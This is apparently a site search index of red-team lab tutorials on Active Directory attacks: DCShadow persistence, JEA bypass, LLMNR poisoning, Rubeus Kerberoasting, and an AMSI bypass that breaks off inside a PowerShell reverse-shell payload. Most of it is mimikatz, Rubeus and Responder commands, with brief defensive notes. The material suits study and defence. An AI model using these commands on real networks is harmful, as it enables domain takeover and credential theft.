/value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)**(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1118)** [ Domain Admin ] lsadump::dcshadow /push \u21d2 We see that the user test1 has the following rights on AdminSDHolder container : References : https://adsecurity.org/?p=1772 , https://www.youtube.com/watch?v=ZPsC_DkR_PI , https://adsecurity.org/?p=1906","title":"DCShadow Attack"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#dcshadow-attack","text":"","title":"DCShadow Attack"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#explanation","text":"\u21d2 DCShadow is late-stage kill chain attack that allows an attacker with SYSTEM privilege on a machine to register as a rogue domain controller and push changes to a domain. You either need Domain Admin or the following rights to push changes to the domain : Domain Object : DS-Replication-Manage-Topology DS-Install-Replica DS-Replication-Synchronize Site Object : CreateChild DeleteChild Computer Object ( Rogue DC ) : WriteProperty Target Object : WriteProperty \u21d2 So to set these ACLs there's a powershell script named Set-DCShadowPermissions which is used to modify AD objects to provide minimal permissions required for DCShadow. \u21d2 The reason this attack is great for persistence is because there are no changelogs showed in the event viewer when we modify an object ACL which is great to hide our tracks \ud83d\ude42 .","title":"Explanation"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#performing-the-attack","text":"","title":"Performing The Attack"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#prerequisites","text":"SYSTEM on a machine Domain Admin account mimikatz","title":"Prerequisites"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#modifying-an-object-attribute","text":"\u21d2 First lets get mimikatz fired up for the attack : [ SYSTEM ] [ Domain Administrator ] \u21d2 So next we will be modifying an user's object description attribute : [System] lsadump::dcshadow /object:test1 /attribute:Description /value=\"DCShadow works eh\" [Domain Admin] lsadump::dcshadow /push Checking the user description with PowerView to confirm we did modify user description attribute :","title":"Modifying an object attribute"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#defenders-perspective","text":"Taking a look at Event Viewer in vDC01 ( Domain Controller ) to check for change logs : The only changelog here is the one showed in the screenshot, but doesn't show any logs that says we modified test1 object attribute. Although we do notice the following GUID [ E3514235\u20134B06\u201311D1-AB04\u201300C04FC2DCD2 ] in the above changelog which basically signifies that this machine is a Domain Controller : So as a defender if u see an machine being assigned the following GUID and is not in the Domain Controller Organizational Unit , it is more likely an rogue domain controller.","title":"\u21d2 Defender's perspective :"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#performing-dcshadow-with-minimal-permissions","text":"\u21d2 So in this example we won't be needing domain admin to push changes to the domain. We will be giving the minimal permissions needed using Set-DCShadowPermissions.ps1 : So we will be giving permissions to user naqi to modify test1 object from machine IIS01 Set-DCShadowPermissions -FakeDC IIS01 -SAMAccountName test1 -Username naqi -Verbose \u21d2 Firing up mimikatz as SYSTEM and Naqi : [ SYSTEM ] lsadump::dcshadow /object:test1 /attribute:Description /value=\"Noice m8\" [ NAQI ] lsadump::dcshadow /push Confirming the changes using PowerView :","title":"Performing DCShadow with minimal permissions"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#setting-sidhistory","text":"\u21d2 SID History enables access for another account to effectively be cloned to another this is useful to ensure users retain access when migrating to different domain . \u21d2 We can set SIDHistory of an user account to Domain Admin / Enterprise Admin group SID which would give the user the privileges of the group we set in the SIDHistory . \u21d2 The reason this is much better than just adding a user to the group directly is : SIDHistory works for SIDs in the same domain as it does across domains in the same forest It is more sneaky and not so easy to spot as compared to modifying primaryGroupID attribute. \u21d2 We will be modifying the SIDHistory attribute for the user test1 to Enterprise Admin group SID which is : Lets get root domain SID and add -519 to it , which will be Enterprise Admins group SID : Enterprise Admins : S-1-5-21-1710056623-765944083-1957563412-519 Next lets fire up mimikatz : [ SYSTEM ] lsadump::dcshadow /object:test1 /attribute:SIDHistory /value:S-1-5-21-1710056623-765944083-1957563412-519 [ NAQI ] lsadump::dcshadow /push Confirming the changes using PowerView :","title":"Setting SIDHistory"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/#adminsdholder","text":"\u21d2 AdminSDHolder is a container in AD that holds the Security Descriptor applied to members of protected groups. AdminSDHolder container can be abused by backdooring it by giving your user GenericAll privileges, which effectively makes that user a Domain Admin. First we will enumerate the current ACLs for AdminSDHolder (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://CN=AdminSDHolder,CN=System,DC=endark,DC=local\")).psbase.ObjectSecurity.sddl (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;<USERSID>) Now lets grab our user SID : (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1118) \u21d2 Next we will fire up mimikatz : \u21d2 We will be modifying the ntSecurityDescriptor attribute to add our ACL to it : [ SYSTEM ] lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=endark,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)**(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1118)** [ Domain Admin ] lsadump::dcshadow /push \u21d2 We see that the user test1 has the following rights on AdminSDHolder container : References : https://adsecurity.org/?p=1772 , https://www.youtube.com/watch?v=ZPsC_DkR_PI , https://adsecurity.org/?p=1906","title":"AdminSDHolder"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/","text":"Just Enough Administration \u21d2 This my friend, is JEA ( Just Enough Administration ) which is a security technology that enables delegated administration for anything managed by powershell. It limits what users can do by specifying which cmdlets, functions, and external commands they can run. It can only constrain powershell access. Lab Setup 1) Setting up Group 2) Setting up JEA i) Creating Configuration file New-PSSessionConfigurationFile -Path 'C:\\Program Files\\WindowsPowerShell\\endark_conf.pssc' notepad C:\\Program Files\\WindowsPowerShell\\endark_conf.pssc ii) Creating folder for JEA New-Item -Path 'C:\\Program Files\\WindowsPowerShell\\Modules\\JEA\\RoleCapabilities' -ItemType Directory iii) Creating the PS Role Capability File for the Endark Admins New-PSRoleCapabilityFile -Path 'C:\\Program Files\\WindowsPowerShell\\Modules\\JEA\\RoleCapabilities\\endark_admins.psrc' notepad C:\\Program Files\\WindowsPowerShell\\Modules\\JEA\\RoleCapabilities\\endark_admins.psrc iv) Registering the Configuration Register-PSSessionConfiguration -Name Endark_Admins -Path 'C:\\Program Files\\WindowsPowerShell\\endark_conf.pssc' Restart-Service WinRM v) Testing it Enter-PSSession -ComputerName vDC01 -credential Andrei -ConfigurationName endark_admins So right now its running in no-language mode which is the safest language mode. JEA Bypasses \u21d2 So there are couple of ways to bypass JEA and i will be showing a few of them Constrained Language Mode Command Injection Script Block Injection 1) Constrained Language Mode In ConstrainedLanguage you are allowed to create new functions and all you gotta do is create a new function that could run anything you want. That is no longer restricted and hence jea can be bypassed. NoLanguageMode is the only safe language mode function CommandName { whoami | out-host } 2) Command Injection \u21d2 So the following function takes user input and run Invoke-Expression with Get-Process on it. This function can be easily exploited by escaping the double quotes . Check-Process \" ; <command> \" 3) Script Block Injection \u21d2 So this script creates a script block which has Invoke-Expression command that includes the input we provided. It runs it on remote system vDC01 as Administrator. Check-Process \" ; <command> \" Reference : https://www.youtube.com/watch?v=ahxMOAAani8 [ Also a lot more attacks covered in the video and mitigation ]","title":"Just Enough Administration"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/#just-enough-administration","text":"\u21d2 This my friend, is JEA ( Just Enough Administration ) which is a security technology that enables delegated administration for anything managed by powershell. It limits what users can do by specifying which cmdlets, functions, and external commands they can run. It can only constrain powershell access.","title":"Just Enough Administration"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/#lab-setup","text":"","title":"Lab Setup"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/#1-setting-up-group","text":"","title":"1) Setting up Group"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/#2-setting-up-jea","text":"i) Creating Configuration file New-PSSessionConfigurationFile -Path 'C:\\Program Files\\WindowsPowerShell\\endark_conf.pssc' notepad C:\\Program Files\\WindowsPowerShell\\endark_conf.pssc ii) Creating folder for JEA New-Item -Path 'C:\\Program Files\\WindowsPowerShell\\Modules\\JEA\\RoleCapabilities' -ItemType Directory iii) Creating the PS Role Capability File for the Endark Admins New-PSRoleCapabilityFile -Path 'C:\\Program Files\\WindowsPowerShell\\Modules\\JEA\\RoleCapabilities\\endark_admins.psrc' notepad C:\\Program Files\\WindowsPowerShell\\Modules\\JEA\\RoleCapabilities\\endark_admins.psrc iv) Registering the Configuration Register-PSSessionConfiguration -Name Endark_Admins -Path 'C:\\Program Files\\WindowsPowerShell\\endark_conf.pssc' Restart-Service WinRM v) Testing it Enter-PSSession -ComputerName vDC01 -credential Andrei -ConfigurationName endark_admins So right now its running in no-language mode which is the safest language mode.","title":"2) Setting up JEA"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/#jea-bypasses","text":"\u21d2 So there are couple of ways to bypass JEA and i will be showing a few of them Constrained Language Mode Command Injection Script Block Injection","title":"JEA Bypasses"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/#1-constrained-language-mode","text":"In ConstrainedLanguage you are allowed to create new functions and all you gotta do is create a new function that could run anything you want. That is no longer restricted and hence jea can be bypassed. NoLanguageMode is the only safe language mode function CommandName { whoami | out-host }","title":"1) Constrained Language Mode"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/#2-command-injection","text":"\u21d2 So the following function takes user input and run Invoke-Expression with Get-Process on it. This function can be easily exploited by escaping the double quotes . Check-Process \" ; <command> \"","title":"2) Command Injection"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/JustEnoughAdministration/#3-script-block-injection","text":"\u21d2 So this script creates a script block which has Invoke-Expression command that includes the input we provided. It runs it on remote system vDC01 as Administrator. Check-Process \" ; <command> \" Reference : https://www.youtube.com/watch?v=ahxMOAAani8 [ Also a lot more attacks covered in the video and mitigation ]","title":"3) Script Block Injection"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/LLMNR%20Poisoning/","text":"LLMNR Poisoning Microsoft systems use LLMNR and the NetBIOS Name Service (NBT-NS) for localhost resolution when DNS lookups file. You can impersonate services that are searched by hosts using Responder to send fake responses. What are we doing? LLMNR Works like this: User tries to access \\\\DC1 DC1 does not have a DNS record User's computer asks on the entire network who is \\\\DC1 \\\\DC1 answers User's computer connects to \\\\DC1 , sending his hash But LLMNR can also go like: User tries to access \\\\DC2 \\\\DC2 does not have a DNS record User's computer asks on the entire network who is \\\\DC2 Nobody answers We can listen to every LLMNR request on the network and answer to the unaswered one's So it will work like: User tries to access \\\\DC2 \\\\DC2 does not have a DNS record User's computer asks on the entire network who is \\\\DC2 Nobody answers Our attacker machine answers to request User's computer connects to \\\\DC2 (our attack machine), sending his hash to us This way, if the user makes a mistake in the hostname, responder can yoink user's NTLMv2 hash\ud83d\ude09 Firing the attack Setting up responder We will need to setup responder answer to unanswered LLMNR request using the following syntax python Responder.py -I <interface> -r -d -w A user makes a mistake..... A user tries to access \\\\client6 which does not exist And we capture his hash! Defending Disable LLMNR, select Turn OFF Multicast Name Resolution under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in GPO Editor Disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced Tab > WINS tab and select \"Disable NetBIOS over TCP/IP\" If a company must use LLMNR, best is to require strong user passwords. Cracking the NTLMv2 challenge response You can use hashcat hashcat -m 5600 ntlmv2 /usr/share/wordlists/rockyou.txt --force","title":"LLMNR Poisoning"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/LLMNR%20Poisoning/#llmnr-poisoning","text":"Microsoft systems use LLMNR and the NetBIOS Name Service (NBT-NS) for localhost resolution when DNS lookups file. You can impersonate services that are searched by hosts using Responder to send fake responses.","title":"LLMNR Poisoning"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/LLMNR%20Poisoning/#what-are-we-doing","text":"LLMNR Works like this: User tries to access \\\\DC1 DC1 does not have a DNS record User's computer asks on the entire network who is \\\\DC1 \\\\DC1 answers User's computer connects to \\\\DC1 , sending his hash But LLMNR can also go like: User tries to access \\\\DC2 \\\\DC2 does not have a DNS record User's computer asks on the entire network who is \\\\DC2 Nobody answers We can listen to every LLMNR request on the network and answer to the unaswered one's So it will work like: User tries to access \\\\DC2 \\\\DC2 does not have a DNS record User's computer asks on the entire network who is \\\\DC2 Nobody answers Our attacker machine answers to request User's computer connects to \\\\DC2 (our attack machine), sending his hash to us This way, if the user makes a mistake in the hostname, responder can yoink user's NTLMv2 hash\ud83d\ude09","title":"What are we doing?"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/LLMNR%20Poisoning/#firing-the-attack","text":"","title":"Firing the attack"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/LLMNR%20Poisoning/#setting-up-responder","text":"We will need to setup responder answer to unanswered LLMNR request using the following syntax python Responder.py -I <interface> -r -d -w","title":"Setting up responder"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/LLMNR%20Poisoning/#a-user-makes-a-mistake","text":"A user tries to access \\\\client6 which does not exist And we capture his hash!","title":"A user makes a mistake....."},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/LLMNR%20Poisoning/#defending","text":"Disable LLMNR, select Turn OFF Multicast Name Resolution under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in GPO Editor Disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced Tab > WINS tab and select \"Disable NetBIOS over TCP/IP\" If a company must use LLMNR, best is to require strong user passwords.","title":"Defending"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/LLMNR%20Poisoning/#cracking-the-ntlmv2-challenge-response","text":"You can use hashcat hashcat -m 5600 ntlmv2 /usr/share/wordlists/rockyou.txt --force","title":"Cracking the NTLMv2 challenge response"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/","text":"Messing with Kerberos using Rubeus What is Rubeus? Rubeus is a toolset for interacting with Kerberos and abusing it written in C# which is regularly updated. Github Repo: https://github.com/GhostPack/Rubeus . You will have to compile it yourself in VS, but it is easy as downloading it, opening the solution, right clicking and hitting build. Basic Commands Hashing your password for further use If you'd like interact with kerberos using a password will have to generate an hash of your password using the following command: Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN] Most of the time you won't need an AES or DES hash type, we will be using the rc4_hmac one. Asking for a TGT Asking for a TGT using Rubeus is really really simple: Rubeus.exe asktgt /user:X /rc4:x , you can also specify /domain: otherwise it will use the domain you are currently signed in Using /outfile: you can save the raw tgt in a file Asking for a TGS So before requesting a TGS we will need a TGT. We can use the tgtdeleg feature which allows you to extract a usable TGT .kirbi from the current user without elevation on the system. Rubeus.exe tgtdeleg /nowrap Next we will use asktgs feature to request a TGS for the service we want using the following command Rubeus.exe asktgs /ticket:base64blob /service:SPN Performing Attacks Kerberoasting Performing kerberoasting attacks using Rubeus is super simple: Rubeus.exe kerberoast , this will get TGS' for every kerberoastable service account. Before running that command you can check the amount of kerberostable users using Rubeus.exe kerberoast /stats . Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking. Kerberoasting is a common, pervasive attack that exploits a combination of weak encryption and poor service account password hygiene. (source: https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/ ) In my case there are is 1 kerberostable service acccount. You can perform the attack by running Rubeus.exe kerberoast You can also save them in a file crackable by hashcat using /outfile: Asreproasting AS-REP Roasting is an attack against Kerberos for user accounts that do not require preauthentication. This is explained in pretty thorough detail in Harmj0y\u2019s post here ( https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/ ), so I\u2019ll focus on summarizing it. Pre-authentication is the first step in Kerberos authentication, and is designed to prevent brute-force password guessing attacks. (Source: https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/ ) You can create an asreproastable account by checking the Do not require Kerberos preauthentication check. Performing this attack using Rubeus is also very simple: Rubeus.exe asreproast In my case, I had 2 asreproastable accounts, asrep and asrep2. You can export them using outfile argument into hashcat for cracking. Constrained Delegation If a user or computer account has a service principal name (SPN) set in its msds-allowedToDelegateto field and an attacker can compromise said user/computer\u2019s account hash, that attacker can pretend to be ANY domain user to ANY service on the targeted host. We will be writing a separate post on s4u since it is a more complex topic. Ticket extraction and harvesting A cool feature of Rubeus is the ability to extract and harvest tickets. Triaging tickets You can triage tickets on the system using Rubeus triage Viewing loaded tickets You can view loaded tickets using Windows' built in command klist . Rubeus has it's own klist alternative: Rubeus klist Dumping Tickets Dumping tickets using rubeus can be done using the dump command: Rubeus klist If you are in an elevated shell you can dump tickets for all users Monitoring and Harvesting Tickets Monitor new TGTs: Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS] , this will check every X seconds for new tgts and list them Harvest new TGTs: Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS] this will monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200) Credits Wrote by Enox and d4rckh Reference: https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/ http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/ Join Red Team Lounge Discord Server if you'd like to discuss more about kerberos abuse: discord.gg/redteaming .","title":"Messing with Kerberos using Rubeus"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#messing-with-kerberos-using-rubeus","text":"","title":"Messing with Kerberos using Rubeus"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#what-is-rubeus","text":"Rubeus is a toolset for interacting with Kerberos and abusing it written in C# which is regularly updated. Github Repo: https://github.com/GhostPack/Rubeus . You will have to compile it yourself in VS, but it is easy as downloading it, opening the solution, right clicking and hitting build.","title":"What is Rubeus?"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#basic-commands","text":"","title":"Basic Commands"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#hashing-your-password-for-further-use","text":"If you'd like interact with kerberos using a password will have to generate an hash of your password using the following command: Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN] Most of the time you won't need an AES or DES hash type, we will be using the rc4_hmac one.","title":"Hashing your password for further use"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#asking-for-a-tgt","text":"Asking for a TGT using Rubeus is really really simple: Rubeus.exe asktgt /user:X /rc4:x , you can also specify /domain: otherwise it will use the domain you are currently signed in Using /outfile: you can save the raw tgt in a file","title":"Asking for a TGT"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#asking-for-a-tgs","text":"So before requesting a TGS we will need a TGT. We can use the tgtdeleg feature which allows you to extract a usable TGT .kirbi from the current user without elevation on the system. Rubeus.exe tgtdeleg /nowrap Next we will use asktgs feature to request a TGS for the service we want using the following command Rubeus.exe asktgs /ticket:base64blob /service:SPN","title":"Asking for a TGS"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#performing-attacks","text":"","title":"Performing Attacks"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#kerberoasting","text":"Performing kerberoasting attacks using Rubeus is super simple: Rubeus.exe kerberoast , this will get TGS' for every kerberoastable service account. Before running that command you can check the amount of kerberostable users using Rubeus.exe kerberoast /stats . Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking. Kerberoasting is a common, pervasive attack that exploits a combination of weak encryption and poor service account password hygiene. (source: https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/ ) In my case there are is 1 kerberostable service acccount. You can perform the attack by running Rubeus.exe kerberoast You can also save them in a file crackable by hashcat using /outfile:","title":"Kerberoasting"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#asreproasting","text":"AS-REP Roasting is an attack against Kerberos for user accounts that do not require preauthentication. This is explained in pretty thorough detail in Harmj0y\u2019s post here ( https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/ ), so I\u2019ll focus on summarizing it. Pre-authentication is the first step in Kerberos authentication, and is designed to prevent brute-force password guessing attacks. (Source: https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/ ) You can create an asreproastable account by checking the Do not require Kerberos preauthentication check. Performing this attack using Rubeus is also very simple: Rubeus.exe asreproast In my case, I had 2 asreproastable accounts, asrep and asrep2. You can export them using outfile argument into hashcat for cracking.","title":"Asreproasting"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#constrained-delegation","text":"If a user or computer account has a service principal name (SPN) set in its msds-allowedToDelegateto field and an attacker can compromise said user/computer\u2019s account hash, that attacker can pretend to be ANY domain user to ANY service on the targeted host. We will be writing a separate post on s4u since it is a more complex topic.","title":"Constrained Delegation"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#ticket-extraction-and-harvesting","text":"A cool feature of Rubeus is the ability to extract and harvest tickets.","title":"Ticket extraction and harvesting"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#triaging-tickets","text":"You can triage tickets on the system using Rubeus triage","title":"Triaging tickets"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#viewing-loaded-tickets","text":"You can view loaded tickets using Windows' built in command klist . Rubeus has it's own klist alternative: Rubeus klist","title":"Viewing loaded tickets"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#dumping-tickets","text":"Dumping tickets using rubeus can be done using the dump command: Rubeus klist If you are in an elevated shell you can dump tickets for all users","title":"Dumping Tickets"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#monitoring-and-harvesting-tickets","text":"Monitor new TGTs: Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS] , this will check every X seconds for new tgts and list them Harvest new TGTs: Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS] this will monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200)","title":"Monitoring and Harvesting Tickets"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Messing%20with%20Kerberos%20using%20Rubeus/#credits","text":"Wrote by Enox and d4rckh Reference: https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/ http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/ Join Red Team Lounge Discord Server if you'd like to discuss more about kerberos abuse: discord.gg/redteaming .","title":"Credits"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Powershell%20AMSI%20Bypass/","text":"Powershell AMSI Bypass What is AMSI ? Essentially, AMSI is an interface on which applications or services are able to scan a script\u2019s content for malicious usage. If a signature in the script is registered by the AMSI antimalware service provider (Windows Defender by default), it will be blocked. When a PowerShell process is created , AMSI.DLL is loaded from disk into its address space. Within AMSI.DLL , there\u2019s a function known as AmsiScanBuffer(), essentially the function used to scan a script\u2019s content. In the PowerShell command prompt, any supplied content would first be sent to AmsiScanBuffer() , before any execution takes place. Subsequently, AmsiScanBuffer() would check with the registered anti-virus to determine if any signatures have been created. If the content is deemed malicious , it would be blocked . Obfuscation \u21d2 So AMSI can be bypassed through obfuscations. You can use the following tools to create obfuscated payloads to bypass AMSI : ISESteroids Invoke-Obfuscation AMSI.FAIL 1) Obfuscating nishang with ISESteroids \u21d2 So when we try running nishang reverse TCP it gets flagged by AMSI as malicious content : $client = New-Object System.Net.Sockets.TCPClient(\"192.168.136.137\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | 